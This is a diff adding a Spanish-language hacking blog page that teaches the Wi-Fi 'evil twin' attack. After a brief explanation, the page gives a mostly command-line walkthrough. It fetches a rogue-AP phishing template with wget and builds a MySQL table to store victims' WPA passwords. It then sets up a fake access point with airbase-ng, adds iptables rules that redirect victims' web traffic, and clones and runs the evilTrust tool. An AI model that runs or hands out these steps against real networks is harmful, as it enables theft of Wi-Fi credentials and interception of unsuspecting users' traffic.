@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <!-- 
+    - primary meta tags
+  -->
+  <title>Wren - Perosonal Blog Website </title>
+  <meta name="title" content="Wren - Perosonal Blog Website">
+  <meta name="description" content="This is a blog html template made by codewithsadee">
+
+  <!-- 
+    - favicon
+  -->
+  <link rel="shortcut icon" href="./favicon.svg" type="image/svg+xml">
+
+  <!-- 
+    - google font link
+  -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Sans:wght@300;400;500;600;700;800&display=swap"
+    rel="stylesheet">
+  <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
+	<script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>
+
+  <!-- 
+    - custom css link
+  -->
+  <link rel="stylesheet" href="../assets/css/style.css">
+  <link rel="stylesheet" href="../assets/css/header.css">
+  <link rel="stylesheet" href="../assets/css/contenedor.css">
+  <link rel="stylesheet" href="../assets/css/footer.css">
+
+
+  <!-- 
+    - preload images
+  -->
+  <link rel="preload" as="image" href="./assets/images/hero-banner.png">
+  <link rel="preload" as="image" href="./assets/images/pattern-2.svg">
+  <link rel="preload" as="image" href="./assets/images/pattern-3.svg">
+
+</head>
+
+<body id="top">
+  <!-- 
+    - #HEADER
+  -->
+  <header class="header">
+		<div class="logo">
+		<img class="logo1" src="./assets/images/logo/menor4.png" alt="">
+		</div>
+	
+		<input type="checkbox" id="toggle">
+		<label for="toggle"><img class="img2"  src="./assets/images/svg/menu.svg" alt="menu"></label>
+	
+	
+		<nav class="navigation">
+			<ul>
+				<li><a href="../index.html"> INICIO </a></li>
+				<li><a href="#"> SEGURIDAD INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTON-HACKING-WIFI/index.html">HACKING WIFI</a></li>
+					<li><a href="../SECTION-HACKING-WEB/index.html">HACKING WEB</a></li>
+					<li><a href="../SECTION-MALWARE/index.html">MALWARE</a></li>
+          <li><a href="../SECTION-BYPASS/index.html">BYPASS</a></li>
+	
+				</ul>
+			</li>
+      <li><a href="#"> INFORMATICA <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTION-LINUX/index.html">LINUX</a></li>
+					<li><a href="../SECTION-PROGRAMACION/index.html">PROGRAMACIÓN</a></li>
+					<li><a href="../SECTION-REDES/index.html">REDES</a></li>
+				
+	
+				</ul>
+			</li>
+				<li><a href="">CTF <i class=" fa-sharp fa-solid fa-caret-down"></i></a>
+				<ul>
+					<li><a href="../SECTION-HACKTHEBOX/index.html">HACKTHEBOX</a></li>
+					
+				
+	
+				</ul>
+	
+				</li>
+				<li><a href="#"> ACERCA DE </a></li>
+			
+			
+			
+			</ul>
+	
+		</nav>
+
+	</header>
+
+  <main class="main-blog">
+
+    <h1 id="h1-main">Ataque de tipo evil twin</h1>
+
+    <p>
+      Un ataque de tipo "Evil Twin" (Gemelo Malvado, en español) es una técnica utilizada en pruebas de penetración y en el ámbito de la ciberseguridad para comprometer la seguridad de las redes inalámbricas, como las redes Wi-Fi. Este tipo de ataque implica la creación de una red inalámbrica falsa que parece ser legítima, engañando a los usuarios y haciéndoles creer que están conectados a una red de confianza cuando, en realidad, están conectados a la red controlada por el atacante.
+    </p>
+    <p>
+      El proceso general de un ataque de Evil Twin suele involucrar los siguientes pasos:
+    </p>
+
+    <p class="p-verde">
+      1 - Identificación de una red objetivo:
+    </p>
+    <p>
+      El atacante identifica una red Wi-Fi legítima que desea emular o copiar. Esto podría ser una red abierta o protegida por una contraseña.
+    </p>
+
+    <p class="p-verde">
+    2 - Creación de una red falsa:
+    </p>
+    <p>
+      El atacante configura un punto de acceso inalámbrico con un nombre de red (SSID) y parámetros de seguridad que son idénticos o similares a la red legítima objetivo. Esto crea una red falsa que se parece mucho a la red real.
+    </p>
+
+    <p class="p-verde">3 - Atracción de usuarios:</p>
+    <p>
+      El atacante puede llevar a cabo estrategias para atraer a usuarios a su red falsa. Esto podría incluir configurar el punto de acceso cerca de la ubicación de la red legítima, aumentar la potencia de la señal, o incluso realizar un ataque de deautenticación para forzar a los dispositivos a buscar una nueva red para conectarse.
+    </p>
+
+    <p class="p-verde">
+      4 - Intercepción de tráfico: 
+    </p>
+
+    <p>
+      Una vez que los usuarios se conectan a la red falsa, el atacante puede interceptar y analizar el tráfico de datos que pasa a través de su punto de acceso. Esto puede incluir la captura de contraseñas, datos personales o cualquier información confidencial transmitida por los usuarios.
+    </p>
+
+    <p class="p-verde">5 - Posible redirección:</p>
+    <p>
+      En algunos casos, el atacante puede redirigir el tráfico web de los usuarios a sitios web falsos o maliciosos para robar credenciales de inicio de sesión o distribuir malware.
+    </p>
+
+    <h3 class="h3-importante">Creando nuestro archivo de configuracion DHCPD</h3>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="assets/images/articulos/ataque-de-tipo-evil-twin/001.webp" alt="Imagen hacking wifi" />
+    </div>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="assets/images/articulos/ataque-de-tipo-evil-twin//002.webp" alt="Imagen hacking wifi" />
+    </div>
+    <h3 class="h3-importante">  Eviltwin descarga y uso de la plantilla</h3>
+
+    <p>Nos dirigimos al directorio</p>
+    <div class="imagenes-blog">
+      <img class="img-contenido-blog" src="assets/images/articulos/ataque-de-tipo-evil-twin//003.webp" alt="Imagen hacking wifi" />
+    </div>
+
+  <p>ejecutamos:</p>
+  <p> <code class="code-command">wget https://cdn.rootsh3ll.com/u/20180724181033/Rogue_AP.zip  </code> </p>
+
+
+  <p>movemos todo el fichero a la carpeta donde nos encontramos</p>
+  <p> <code class="code-command">mv Rogue_AP/* .</code> </p>
+  <p>iniciamos los servicios apache2 y mysql</p>
+  <p> <code class="code-command"> sudo service start apache2 </code> </p>
+  <p> <code class="code-command">sudo service start mysql  </code> </p>
+
+  <p>
+    ahora en el localhost estará corriendo la plantilla que es totalmente personalisable
+  </p>
+  <div class="imagenes-blog">
+    <img class="img-contenido-blog" src="assets/images/articulos/ataque-de-tipo-evil-twin//004.webp" alt="Imagen hacking wifi" />
+  </div>
+  <h3 class="h3-importante">Eviltwin creación de base de datos en MYSQL</h3>
+  <p>nos conectamos a la base de datos con</p>
+  <p> <code class="code-command">   mysql -uroot   </code> </p>
+  <p>creamos una base de datos</p>
+
+  <p> <code class="code-command"> create database rogue_AP; </code> </p>
+
+  <p>usamos la base de datos</p>
+  <p> <code class="code-command">use rogue_AP;  </code> </p>
+  <p>creamos una tabla con 2 campos</p>
+  <p> <code class="code-command">create table wpa_keys(password1 varchar(32), password2 varchar(32));  </code> </p>
+  <p>procedemos a crear a el usuario</p>
+  <p> <code class="code-command">create user fakeap@localhost identified by 'fakeap';  </code> </p>
+  <p>asignamos al usuario fakeap todos los privilegios para acceder a la base de datos</p>
+  <p> <code class="code-command">grant all privileges on rogue_AP.* to 'fakeap'@'localhost'; </code> </p>
+  <p>ahora al ingresar la victima la contraseña podremos ver una plantilla de carga</p>
+
+  <h3 class="h3-importante"> Montando el punto de acceso con airbase</h3>
+  <p> <code class="code-command">airbase-ng -e &lt;WifiFree&gt; -c 1 -P &lt;wlan0mon&gt;</code> </p>
+  <p> <code class="code-command">-e</code> El nombre del essid </p>
+  <p> <code class="code-command">-c</code> El canal</p>
+  <p> <code class="code-command">-P</code> La interface de red</p>
+
+  <h3 class="h3-importante"> Definicion de reglas con iptables y creacion de interfaces de red</h3>
+
+  <p>debemos crear una interface de red siguiendo el fichero dhcpd.conf, para hacker esto debemos tener montado el falso punto de acceso</p>
+
+  <p> <code class="code-command">ifconfig at0 192.168.1.129 netmask 255.255.255.128  </code> </p>
+  <p> <code class="code-command">route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129  </code> </p>
+
+  <p>habilitar el enrutamiento por equipo</p>
+
+  <p> <code class="code-command"> echo 1 > /proc/sys/net/ipv4/ip_forward </code> </p>
+
+  <p>Antes de proceder a crear los iptables haremos una limpieza de las mismas</p>
+  <p> <code class="code-command"> iptables --flush </code> </p>
+  <p> <code class="code-command">iptables --table nat --flush  </code> </p>
+  <p> <code class="code-command"> iptables --delete-chain </code> </p>
+  <p> <code class="code-command">iptables --table nat --delete-chain  </code> </p>
+
+
+  <p>procedemos a crear los iptables</p>
+  <p> <code class="code-command"> iptables --table nat --append POSTROUTING --out-interface &lt;wlp3s0&gt; -j MASQUERADE </code> </p>
+
+  <p> <code class="code-command"> iptables --append FORWARD --in-interface at0 -j ACCEPT </code> </p>
+  <p> <code class="code-command">iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80   </code> </p>
+  <p> <code class="code-command"> iptables -t nat -A POSTROUTING -j MASQUERADE </code> </p>
+
+  <h3 class="h3-importante">Desplegando finalmente el ataque</h3>
+  <p>Veremos como se despliega el ataque usando 2 distintas tarjetas de red una alfa y otra tp-link</p>
+  <p class="p-verde">En este caso usaremos una tarjeta de red alfa</p>
+  <p>nos dirigimos al directorio donde esta nuestro archivo dhcpd.conf</p>
+  <p> <code class="code-command">cd /etc/  </code> </p>
+
+  <p>creamos un fichero para que no nos de error</p>
+  <p> <code class="code-command"> touch /var/lib/dhcp/dhcpd.leases </code> </p>
+
+  <p> <code class="code-command">dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcp.pid at0  </code> </p>
+
+  <p class="p-verde">En este caso usaremos una tarjeta de red tp-link</p>
+
+  <p> <code class="code-command"> sudo su </code> </p>
+  <p> <code class="code-command"> cd /otp </code> </p>
+  <p> <code class="code-command">git clone https://github.com/s4vitar/evilTrust.git  </code> </p>
+  <p> <code class="code-command">cd evilTrust/  </code> </p>
+  <p> <code class="code-command"> ./evilTrust.sh -m terminal </code> </p>
+
+
+  <div class="imagenes-blog">
+    <img class="img-contenido-blog" src="assets/images/articulos/ataque-de-tipo-evil-twin//005.webp" alt="Imagen hacking wifi" />
+  </div>
+
+
+
+
+  <br>    <br>
+
+
+
+
+</main>
+
+
+  <!-- 
+    - #BACK TO TOP
+  -->
+
+  <footer class="footer"> 
+    <div class="izquierda">  
+  
+      <a href="#" id="footer-a"><a href="#">
+        <img src="../assets/images/logo/menorH.png" alt="logo h4ckdino">
+      </a>  © 2023 h4ckdino, Inc. </a>
+      <a href="#" id="footer-a">Ponte en contacto con nosotros</a>
+      <a href="#" id="footer-a" >Configuración de cookies</a>
+      <a href="#" id="footer-a" >Politica de privacidad</a>
+      
+  
+      
+    </div>
+  </footer>
+  
+
+
+
+
+  <!-- 
+    - custom js link
+  -->
+  <script src="./assets/js/script.js"></script>
+
+  <!-- 
+    - ionicon link
+  -->
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+
+</body>
+
+</html>
